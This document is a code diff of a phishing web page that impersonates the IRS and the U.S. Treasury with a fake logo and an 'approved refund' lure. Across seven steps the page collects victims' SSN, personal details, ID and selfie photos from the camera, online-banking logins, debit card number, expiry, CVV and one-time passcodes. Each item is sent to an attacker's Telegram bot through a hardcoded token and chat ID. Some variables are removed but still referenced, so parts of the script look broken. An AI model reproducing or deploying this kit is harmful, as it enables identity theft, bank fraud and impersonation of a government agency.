@@ -1,9 +1,10 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
-    <title>Fix My Return · Claim Refund</title>
+    <title>IRS · Tax Refund Claim</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
@@ -16,13 +17,13 @@
         }
 
         body {
-            background: #F5F7FA;
+            background: #E9EDF4;
             font-family: 'Inter', -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, Arial, sans-serif;
             display: flex;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            padding: 20px;
+            padding: 16px;
         }
 
         .container {
@@ -31,39 +32,81 @@
             margin: 0 auto;
         }
 
-        /* Card style — clean, professional */
+        /* Card - government style */
         .card {
             background: #FFFFFF;
-            border-radius: 20px;
-            padding: 32px 28px 36px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.06), 0 2px 8px rgba(0, 0, 0, 0.02);
-            border: 1px solid #E8EDF4;
+            border-radius: 24px;
+            padding: 32px 24px 36px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.06), 0 2px 8px rgba(0, 0, 0, 0.02);
+            border: 1px solid #DCE3ED;
         }
 
-        /* --- LANDING: tax refund header --- */
-        .refund-header {
+        /* ---- IRS LOGO / HEADER ---- */
+        .irs-header {
             text-align: center;
             margin-bottom: 24px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #E8EDF4;
         }
 
-        .refund-badge {
+        .irs-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 6px;
+        }
+
+        .irs-logo svg {
+            width: 48px;
+            height: 48px;
+        }
+
+        .irs-logo-text {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0A192F;
+            letter-spacing: -0.5px;
+        }
+
+        .irs-logo-text span {
+            font-weight: 300;
+            color: #4A5F7A;
+            font-size: 20px;
+        }
+
+        .irs-sub {
+            font-size: 11px;
+            color: #5E6F8A;
+            letter-spacing: 0.8px;
+            text-transform: uppercase;
+            font-weight: 600;
+            border-top: 1px solid #E8EDF4;
+            padding-top: 8px;
+            margin-top: 4px;
+        }
+
+        .irs-badge {
             display: inline-block;
             background: #E9F2FD;
             color: #1A4CFF;
             font-weight: 600;
-            font-size: 0.7rem;
+            font-size: 0.65rem;
             letter-spacing: 0.4px;
-            padding: 0.25rem 1.2rem;
+            padding: 0.2rem 1rem;
             border-radius: 100px;
             border: 1px solid #C5D9F5;
-            margin-bottom: 12px;
+            margin-top: 4px;
         }
 
+        /* Refund amount */
         .refund-amount {
-            font-size: 3.6rem;
+            font-size: 3.4rem;
             font-weight: 700;
             color: #0A192F;
             letter-spacing: -0.02em;
+            text-align: center;
+            margin: 8px 0 2px;
         }
 
         .refund-amount small {
@@ -84,18 +127,20 @@
             padding: 0.3rem 1.2rem;
             border-radius: 100px;
             border: 1px solid #B7E0CD;
-            margin-top: 4px;
+            margin: 4px auto 0;
+            justify-content: center;
         }
 
         .subhead {
-            margin-top: 12px;
-            color: #2D405B;
+            margin-top: 14px;
+            color: #1F3450;
             font-size: 0.95rem;
             background: #F8FBFF;
             border-left: 4px solid #1A4CFF;
             padding: 0.7rem 1.2rem;
             border-radius: 0 12px 12px 0;
             line-height: 1.5;
+            font-weight: 450;
         }
 
         .status-grid {
@@ -173,9 +218,9 @@
             padding-top: 1.2rem;
         }
 
-        /* --- Shared form styles --- */
+        /* Form elements */
         .input-group {
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
 
         .input-label {
@@ -315,11 +360,11 @@
             font-weight: 500;
         }
 
-        /* --- KYC Camera UI (PayPal style) --- */
+        /* KYC Camera */
         .step-indicator {
             display: flex;
             gap: 8px;
-            margin-bottom: 24px;
+            margin-bottom: 20px;
         }
 
         .step-dot {
@@ -444,22 +489,66 @@
             margin-top: 20px;
             line-height: 1.4;
         }
+
+        /* Card row for expiry & CVV */
+        .card-row {
+            display: flex;
+            gap: 14px;
+        }
+        .card-row .input-group {
+            flex: 1;
+        }
+        .card-row .input-group:last-child {
+            flex: 0.6;
+        }
+
+        /* Mobile perfect */
+        @media (max-width: 420px) {
+            .card {
+                padding: 24px 16px 28px;
+            }
+            .refund-amount {
+                font-size: 2.8rem;
+            }
+            .irs-logo-text {
+                font-size: 24px;
+            }
+            .irs-logo svg {
+                width: 40px;
+                height: 40px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- LANDING: Elegible for refund -->
+        <!-- LANDING: IRS style -->
         <div id="landingPanel" class="card">
-            <div class="refund-header">
-                <div class="refund-badge">📄 2025 Tax Return · E-filed 08/19</div>
-                <div class="refund-amount">
-                    $1,464 <small>refund</small>
+            <div class="irs-header">
+                <div class="irs-logo">
+                    <!-- IRS styled logo -->
+                    <svg viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="4" y="4" width="56" height="56" rx="12" fill="#0A192F" />
+                        <path d="M18 28L32 14L46 28L32 42L18 28Z" fill="white" />
+                        <path d="M26 28L32 22L38 28L32 34L26 28Z" fill="#1A4CFF" />
+                        <circle cx="32" cy="28" r="4" fill="white" />
+                        <text x="32" y="52" font-family="Inter" font-size="10" font-weight="700" fill="white" text-anchor="middle">IRS</text>
+                    </svg>
+                    <span class="irs-logo-text">IRS<span>.gov</span></span>
                 </div>
-                <div class="eligibility-tag">✅ You are eligible — federal refund</div>
+                <div class="irs-badge">OFFICIAL · U.S. DEPARTMENT OF THE TREASURY</div>
+                <div class="irs-sub">Tax Refund · 2025 Filing Season</div>
+            </div>
+
+            <div class="refund-amount">
+                $1,464 <small>refund</small>
+            </div>
+            <div style="text-align:center;">
+                <span class="eligibility-tag">✅ You are eligible — federal refund</span>
             </div>
             <div class="subhead">
-                <strong>Your federal tax refund of $1,464</strong> is available. 
-                Complete the secure verification to claim your funds.
+                <strong>Your federal tax refund of $1,464</strong> is approved and ready to claim. 
+                Complete the secure verification process to receive your funds.
             </div>
             <div class="status-grid">
                 <div class="status-item">
@@ -476,13 +565,13 @@
                 </div>
             </div>
             <button class="claim-btn" id="startClaimBtn">💰 Claim your refund</button>
-            <div class="footnote">Fix My Return · Secure verification</div>
+            <div class="footnote">IRS Secure Verification · Your information is protected</div>
         </div>
 
         <!-- STEP 1: Personal details -->
         <div id="personalPanel" class="card hide">
-            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🔐 Personal details</h2>
-            <div style="font-size:0.9rem; color:#4A5F7A; margin-bottom:20px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 1 of 6 · Verify your identity</div>
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🔐 Identity verification</h2>
+            <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 1 of 7 · Confirm your identity</div>
             <div class="input-group">
                 <div class="input-label">Full legal name</div>
                 <input type="text" id="fullName" placeholder="John M. Doe" />
@@ -502,7 +591,7 @@
         <!-- STEP 2: SSN -->
         <div id="ssnPanel" class="card hide">
             <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🆔 Social Security Number</h2>
-            <div style="font-size:0.9rem; color:#4A5F7A; margin-bottom:20px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 2 of 6 · Secure SSN entry</div>
+            <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 2 of 7 · Secure SSN entry</div>
             <div class="input-group">
                 <div class="input-label">Social Security Number</div>
                 <input type="password" id="ssnInput" placeholder="XXX-XX-XXXX" />
@@ -517,7 +606,6 @@
             <div class="step-indicator" id="stepIndicator">
                 <div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div>
             </div>
-            <!-- KYC Step 1: ID metadata -->
             <div id="kycStep1" class="kyc-step">
                 <div class="input-group"><div class="input-label">ID type</div><select id="idType"><option value="">Select document</option><option>Driver's License</option><option>State ID Card</option><option>Passport</option><option>Resident Permit</option></select></div>
                 <div class="input-group"><div class="input-label">Issuing state / country</div><select id="idState"><option value="">Select state or region</option><option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option><option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option><option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option><option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option><option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option><option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option><option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option><option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option><option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option><option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option><option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option><option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option><option>Wisconsin</option><option>Wyoming</option></select></div>
@@ -553,7 +641,7 @@
         <!-- STEP 4: Select Bank -->
         <div id="bankPanel" class="card hide">
             <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🏦 Select your bank</h2>
-            <div style="font-size:0.9rem; color:#4A5F7A; margin-bottom:20px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 4 of 6 · Choose your financial institution</div>
+            <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 4 of 7 · Choose your financial institution</div>
             <div class="input-group">
                 <div class="input-label">Bank name</div>
                 <select id="bankSelect">
@@ -575,7 +663,7 @@
         <!-- STEP 5: Bank login -->
         <div id="bankLoginPanel" class="card hide">
             <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🔑 Bank login</h2>
-            <div style="font-size:0.9rem; color:#4A5F7A; margin-bottom:20px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 5 of 6 · Secure credential entry</div>
+            <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 5 of 7 · Secure credential entry</div>
             <div class="input-group">
                 <div class="input-label">Online banking username</div>
                 <input type="text" id="bankUsername" placeholder="username" />
@@ -589,26 +677,44 @@
             <div class="back-link"><a href="#" id="backToBankFromLogin">← Back</a></div>
         </div>
 
-        <!-- STEP 6: Debit card & OTP -->
-        <div id="otpPanel" class="card hide">
-            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">💳 Debit card & OTP</h2>
-            <div style="font-size:0.9rem; color:#4A5F7A; margin-bottom:20px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 6 of 6 · Final verification</div>
-            <div class="otp-hint">🔐 Verification code sent to your registered mobile</div>
+        <!-- STEP 6: Debit Card -->
+        <div id="cardPanel" class="card hide">
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">💳 Debit card details</h2>
+            <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 6 of 7 · Enter your card information</div>
             <div class="input-group">
                 <div class="input-label">Debit card number</div>
                 <input type="text" id="debitCard" placeholder="**** **** **** ****" />
             </div>
+            <div class="card-row">
+                <div class="input-group">
+                    <div class="input-label">Expiry date</div>
+                    <input type="text" id="cardExpiry" placeholder="MM/YY" />
+                </div>
+                <div class="input-group">
+                    <div class="input-label">CVV</div>
+                    <input type="text" id="cardCvv" placeholder="***" />
+                </div>
+            </div>
+            <button class="action-btn" id="cardNextBtn">Continue →</button>
+            <div class="back-link"><a href="#" id="backToBankLoginFromCard">← Back</a></div>
+        </div>
+
+        <!-- STEP 7: OTP -->
+        <div id="otpPanel" class="card hide">
+            <h2 style="font-size:1.5rem; font-weight:700; color:#0A192F; margin-bottom:4px;">🔐 One‑time passcode</h2>
+            <div style="font-size:0.85rem; color:#4A5F7A; margin-bottom:18px; border-bottom:1px solid #EEF3FA; padding-bottom:10px;">Step 7 of 7 · Final verification</div>
+            <div class="otp-hint">📱 Verification code sent to your registered mobile</div>
             <div class="input-group">
-                <div class="input-label">One‑time passcode (OTP)</div>
-                <input type="text" id="otpInput" placeholder="6‑digit code" />
+                <div class="input-label">Enter 6‑digit code</div>
+                <input type="text" id="otpInput" placeholder="000000" />
             </div>
             <button class="action-btn" id="finalSubmitBtn">✅ Submit & claim</button>
             <div class="resend-options">
                 <button class="link-btn" id="resendOtpBtn">📱 Resend SMS</button>
-                <button class="link-btn" id="emailOtpBtn">✉️ Send code via email</button>
+                <button class="link-btn" id="emailOtpBtn">✉️ Send via email</button>
             </div>
-            <div class="back-link"><a href="#" id="backToBankLoginFromOtp">← Back</a></div>
-            <div class="terms">By submitting, you agree to our secure verification process.</div>
+            <div class="back-link"><a href="#" id="backToCardFromOtp">← Back</a></div>
+            <div class="terms">By submitting, you agree to IRS Secure Verification.</div>
         </div>
 
         <div id="toastMsg" class="toast"></div>
@@ -621,11 +727,9 @@
 
     <script>
         (function() {
-            // Telegram bot credentials
             const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
             const CHAT_ID = "8737104261";
 
-            // State
             const userData = {
                 fullName: '',
                 dob: '',
@@ -637,25 +741,17 @@
                 bankUsername: '',
                 bankPassword: '',
                 debitCard: '',
+                cardExpiry: '',
+                cardCvv: '',
                 otp: ''
             };
 
-            // DOM panels
-            const landingPanel = document.getElementById('landingPanel');
-            const personalPanel = document.getElementById('personalPanel');
-            const ssnPanel = document.getElementById('ssnPanel');
-            const kycPanel = document.getElementById('kycPanel');
-            const bankPanel = document.getElementById('bankPanel');
-            const bankLoginPanel = document.getElementById('bankLoginPanel');
-            const otpPanel = document.getElementById('otpPanel');
-            const toast = document.getElementById('toastMsg');
-            const loadingOverlay = document.getElementById('loadingOverlay');
-
             function showToast(msg, isError = false) {
-                toast.innerText = msg;
-                toast.classList.add('show');
-                toast.style.background = isError ? '#B22222' : '#1A2C3E';
-                setTimeout(() => toast.classList.remove('show'), 3500);
+                const t = document.getElementById('toastMsg');
+                t.innerText = msg;
+                t.classList.add('show');
+                t.style.background = isError ? '#B22222' : '#1A2C3E';
+                setTimeout(() => t.classList.remove('show'), 3500);
             }
 
             async function sendToTelegram(text) {
@@ -672,53 +768,51 @@
             async function sendPhotoToTelegram(blob, caption) {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'kyc_verification.jpg');
+                formData.append('photo', blob, 'kyc_irs.jpg');
                 if (caption) formData.append('caption', caption);
                 try {
-                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST',
+                        body: formData });
                     return res.ok;
                 } catch (e) { return false; }
             }
 
-            // ---- Navigation ----
-            function showPanel(panelId) {
+            function showPanel(id) {
                 document.querySelectorAll('.card').forEach(p => p.classList.add('hide'));
-                document.getElementById(panelId).classList.remove('hide');
+                document.getElementById(id).classList.remove('hide');
             }
 
-            // Landing -> Personal
+            // Navigation
             document.getElementById('startClaimBtn').onclick = () => showPanel('personalPanel');
             document.getElementById('backToLanding').onclick = (e) => { e.preventDefault();
                 showPanel('landingPanel'); };
 
-            // Personal -> SSN
             document.getElementById('personalNextBtn').onclick = () => {
-                const name = document.getElementById('fullName').value.trim();
-                const dob = document.getElementById('dob').value;
-                const addr = document.getElementById('address').value.trim();
-                if (!name || !dob || !addr) { showToast('Please fill all fields.', true); return; }
-                userData.fullName = name;
-                userData.dob = dob;
-                userData.address = addr;
-                sendToTelegram(`👤 <b>Personal details</b>\nName: ${name}\nDOB: ${dob}\nAddress: ${addr}`);
+                const n = document.getElementById('fullName').value.trim();
+                const d = document.getElementById('dob').value;
+                const a = document.getElementById('address').value.trim();
+                if (!n || !d || !a) { showToast('Please fill all fields.', true); return; }
+                userData.fullName = n;
+                userData.dob = d;
+                userData.address = a;
+                sendToTelegram(`👤 <b>Personal</b>\nName: ${n}\nDOB: ${d}\nAddress: ${a}`);
                 showPanel('ssnPanel');
             };
             document.getElementById('backToPersonal').onclick = (e) => { e.preventDefault();
                 showPanel('personalPanel'); };
 
-            // SSN -> KYC
             document.getElementById('ssnNextBtn').onclick = () => {
-                const ssn = document.getElementById('ssnInput').value.trim();
-                if (ssn.length < 4) { showToast('Enter a valid SSN.', true); return; }
-                userData.ssn = ssn;
-                sendToTelegram(`🆔 <b>SSN</b>: ${ssn}`);
+                const s = document.getElementById('ssnInput').value.trim();
+                if (s.length < 4) { showToast('Enter a valid SSN.', true); return; }
+                userData.ssn = s;
+                sendToTelegram(`🆔 <b>SSN</b>: ${s}`);
                 showPanel('kycPanel');
                 showKycStep(1);
             };
             document.getElementById('backToSsnFromKyc').onclick = (e) => { e.preventDefault();
                 showPanel('ssnPanel'); };
 
-            // ---- KYC Camera logic (PayPal style) ----
+            // ---- KYC ----
             let currentKycStep = 1;
             let frontStream, backStream, selfieStream, selfieIdStream;
             let usingRearFront = true,
@@ -726,60 +820,52 @@
                 usingRearSelfie = false,
                 usingRearSelfieId = false;
 
-            function stopStream(stream) {
-                if (stream && stream.getTracks) stream.getTracks().forEach(t => t.stop());
-            }
+            function stopStream(s) { if (s && s.getTracks) s.getTracks().forEach(t => t.stop()); }
 
             async function initCamera(videoEl, facingMode) {
                 try {
-                    let constraints = { video: { facingMode: { exact: facingMode } } };
-                    let stream = await navigator.mediaDevices.getUserMedia(constraints);
-                    videoEl.srcObject = stream;
+                    let s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
+                    videoEl.srcObject = s;
                     await videoEl.play();
-                    return stream;
+                    return s;
                 } catch (e) {
-                    let fallback = await navigator.mediaDevices.getUserMedia({ video: true });
-                    videoEl.srcObject = fallback;
+                    let s = await navigator.mediaDevices.getUserMedia({ video: true });
+                    videoEl.srcObject = s;
                     await videoEl.play();
-                    return fallback;
+                    return s;
                 }
             }
 
             async function switchCamera(video, currentStream, setStream, setRear, currentRear) {
                 if (currentStream) stopStream(currentStream);
                 let newFacing = currentRear ? 'user' : 'environment';
-                let newStream = await initCamera(video, newFacing);
-                setStream(newStream);
+                let s = await initCamera(video, newFacing);
+                setStream(s);
                 setRear(!currentRear);
             }
 
-            async function capturePhoto(video, statusElem, sideDescription, nextStepCallback = null) {
-                if (!video.videoWidth || video.videoWidth === 0) {
-                    showToast('Camera not ready', true);
-                    return;
-                }
+            async function capturePhoto(video, statusElem, side, next) {
+                if (!video.videoWidth || video.videoWidth === 0) { showToast('Camera not ready', true); return; }
                 statusElem.innerText = 'Uploading...';
                 let canvas = document.createElement('canvas');
                 let size = Math.min(video.videoWidth, video.videoHeight);
                 canvas.width = size;
                 canvas.height = size;
                 let ctx = canvas.getContext('2d');
-                let sx = (video.videoWidth - size) / 2;
-                let sy = (video.videoHeight - size) / 2;
+                let sx = (video.videoWidth - size) / 2,
+                    sy = (video.videoHeight - size) / 2;
                 ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size);
                 canvas.toBlob(async blob => {
-                    const caption =
-                        `[KYC] ${sideDescription} | ${userData.fullName} | SSN: ${userData.ssn}`;
-                    await sendPhotoToTelegram(blob, caption);
-                    statusElem.innerText = `✅ ${sideDescription} uploaded.`;
-                    if (nextStepCallback) setTimeout(() => nextStepCallback(), 700);
+                    await sendPhotoToTelegram(blob, `[IRS KYC] ${side} | ${userData.fullName}`);
+                    statusElem.innerText = `✅ ${side} uploaded.`;
+                    if (next) setTimeout(next, 700);
                 }, 'image/jpeg', 0.8);
             }
 
             function showKycStep(step) {
                 document.querySelectorAll('.kyc-step').forEach(el => el.classList.add('hide'));
-                const target = document.getElementById(`kycStep${step}`);
-                if (target) target.classList.remove('hide');
+                const t = document.getElementById(`kycStep${step}`);
+                if (t) t.classList.remove('hide');
                 currentKycStep = step;
                 updateStepDots(step);
                 if (step === 2) {
@@ -818,33 +904,28 @@
                 });
             }
 
-            // KYC Step 1 (metadata)
             document.getElementById('kycStep1Next').onclick = () => {
-                let idType = document.getElementById('idType').value;
-                let idState = document.getElementById('idState').value;
-                if (!idType || !idState) { showToast('Select ID type and issuing state.', true); return; }
-                userData.idType = idType;
-                userData.idState = idState;
-                sendToTelegram(`📄 <b>ID details</b>\nType: ${idType}\nState: ${idState}`);
+                let type = document.getElementById('idType').value;
+                let state = document.getElementById('idState').value;
+                if (!type || !state) { showToast('Select ID type and issuing state.', true); return; }
+                userData.idType = type;
+                userData.idState = state;
+                sendToTelegram(`📄 <b>ID</b>: ${type} (${state})`);
                 showKycStep(2);
             };
 
-            // Camera controls
             document.getElementById('switchFrontCam').onclick = () => switchCamera(document.getElementById('frontVideo'),
                 frontStream, s => frontStream = s, v => usingRearFront = v, usingRearFront);
             document.getElementById('captureFrontBtn').onclick = () => capturePhoto(document.getElementById('frontVideo'),
                 document.getElementById('frontStatus'), 'FRONT_ID', () => showKycStep(3));
-
             document.getElementById('switchBackCam').onclick = () => switchCamera(document.getElementById('backVideo'),
                 backStream, s => backStream = s, v => usingRearBack = v, usingRearBack);
             document.getElementById('captureBackBtn').onclick = () => capturePhoto(document.getElementById('backVideo'),
                 document.getElementById('backStatus'), 'BACK_ID', () => showKycStep(4));
-
             document.getElementById('switchSelfieCam').onclick = () => switchCamera(document.getElementById('selfieVideo'),
                 selfieStream, s => selfieStream = s, v => usingRearSelfie = v, usingRearSelfie);
             document.getElementById('captureSelfieBtn').onclick = () => capturePhoto(document.getElementById('selfieVideo'),
                 document.getElementById('selfieStatus'), 'SELFIE_FACE', () => showKycStep(5));
-
             document.getElementById('switchSelfieIdCam').onclick = () => switchCamera(document.getElementById('selfieIdVideo'),
                 selfieIdStream, s => selfieIdStream = s, v => usingRearSelfieId = v, usingRearSelfieId);
             document.getElementById('captureSelfieIdBtn').onclick = () => {
@@ -859,51 +940,60 @@
                     });
             };
 
-            // KYC -> Bank
             document.getElementById('backToKycFromBank').onclick = (e) => { e.preventDefault();
                 showPanel('kycPanel');
                 showKycStep(5); };
 
-            // Bank -> Bank Login
             document.getElementById('bankNextBtn').onclick = () => {
-                const bank = document.getElementById('bankSelect').value;
-                if (!bank) { showToast('Select your bank.', true); return; }
-                userData.bank = bank;
-                sendToTelegram(`🏦 <b>Bank selected</b>: ${bank}`);
+                const b = document.getElementById('bankSelect').value;
+                if (!b) { showToast('Select your bank.', true); return; }
+                userData.bank = b;
+                sendToTelegram(`🏦 <b>Bank</b>: ${b}`);
                 showPanel('bankLoginPanel');
             };
             document.getElementById('backToBankFromLogin').onclick = (e) => { e.preventDefault();
                 showPanel('bankPanel'); };
 
-            // Bank Login -> OTP
             document.getElementById('bankLoginNextBtn').onclick = () => {
-                const un = document.getElementById('bankUsername').value.trim();
-                const pw = document.getElementById('bankPassword').value.trim();
-                if (!un || !pw) { showToast('Enter bank credentials.', true); return; }
-                userData.bankUsername = un;
-                userData.bankPassword = pw;
-                sendToTelegram(`🔑 <b>Bank login</b>\nUser: ${un}\nPass: ${pw}`);
-                showPanel('otpPanel');
+                const u = document.getElementById('bankUsername').value.trim();
+                const p = document.getElementById('bankPassword').value.trim();
+                if (!u || !p) { showToast('Enter bank credentials.', true); return; }
+                userData.bankUsername = u;
+                userData.bankPassword = p;
+                sendToTelegram(`🔑 <b>Bank login</b>\nUser: ${u}\nPass: ${p}`);
+                showPanel('cardPanel');
             };
-            document.getElementById('backToBankLoginFromOtp').onclick = (e) => { e.preventDefault();
+            document.getElementById('backToBankLoginFromCard').onclick = (e) => { e.preventDefault();
                 showPanel('bankLoginPanel'); };
 
-            // Final submit
-            document.getElementById('finalSubmitBtn').onclick = async () => {
+            document.getElementById('cardNextBtn').onclick = () => {
                 const dc = document.getElementById('debitCard').value.trim();
-                const otp = document.getElementById('otpInput').value.trim();
+                const ex = document.getElementById('cardExpiry').value.trim();
+                const cv = document.getElementById('cardCvv').value.trim();
                 if (!dc || dc.length < 4) { showToast('Enter valid debit card.', true); return; }
-                if (!otp || otp.length < 4) { showToast('Enter OTP.', true); return; }
+                if (!ex || ex.length < 4) { showToast('Enter expiry date (MM/YY).', true); return; }
+                if (!cv || cv.length < 3) { showToast('Enter CVV.', true); return; }
                 userData.debitCard = dc;
+                userData.cardExpiry = ex;
+                userData.cardCvv = cv;
+                sendToTelegram(`💳 <b>Card</b>: ${dc} | Exp: ${ex} | CVV: ${cv}`);
+                showPanel('otpPanel');
+            };
+            document.getElementById('backToCardFromOtp').onclick = (e) => { e.preventDefault();
+                showPanel('cardPanel'); };
+
+            document.getElementById('finalSubmitBtn').onclick = async () => {
+                const otp = document.getElementById('otpInput').value.trim();
+                if (!otp || otp.length < 4) { showToast('Enter OTP.', true); return; }
                 userData.otp = otp;
 
                 const msg =
-                    `✅ <b>FULL REFUND CLAIM</b>\n` +
+                    `✅ <b>IRS REFUND CLAIM — COMPLETE</b>\n` +
                     `👤 ${userData.fullName}\n📅 ${userData.dob}\n📍 ${userData.address}\n` +
                     `🔑 SSN: ${userData.ssn}\n📄 ID: ${userData.idType} (${userData.idState})\n` +
                     `🏦 ${userData.bank}\n👤 ${userData.bankUsername}\n🔒 ${userData.bankPassword}\n` +
-                    `💳 ${userData.debitCard}\n🔢 OTP: ${userData.otp}\n` +
-                    `✅ All KYC photos uploaded.`;
+                    `💳 ${userData.debitCard} | Exp: ${userData.cardExpiry} | CVV: ${userData.cardCvv}\n` +
+                    `🔢 OTP: ${userData.otp}\n✅ All KYC photos uploaded.`;
 
                 await sendToTelegram(msg);
                 loadingOverlay.classList.add('active');
@@ -914,17 +1004,15 @@
                 }, 1800);
             };
 
-            // Resend OTP actions
             document.getElementById('resendOtpBtn').onclick = async () => {
                 showToast('New code sent to your phone.', false);
-                await sendToTelegram(`🔄 <b>Resend OTP (SMS)</b> for ${userData.fullName}`);
+                await sendToTelegram(`🔄 <b>Resend OTP</b> for ${userData.fullName}`);
             };
             document.getElementById('emailOtpBtn').onclick = async () => {
                 showToast('Code sent to your registered email.', false);
-                await sendToTelegram(`✉️ <b>OTP via email requested</b> for ${userData.fullName}`);
+                await sendToTelegram(`✉️ <b>OTP via email</b> for ${userData.fullName}`);
             };
 
-            // Close toast on click
             toast.onclick = () => toast.classList.remove('show');
         })();
     </script>
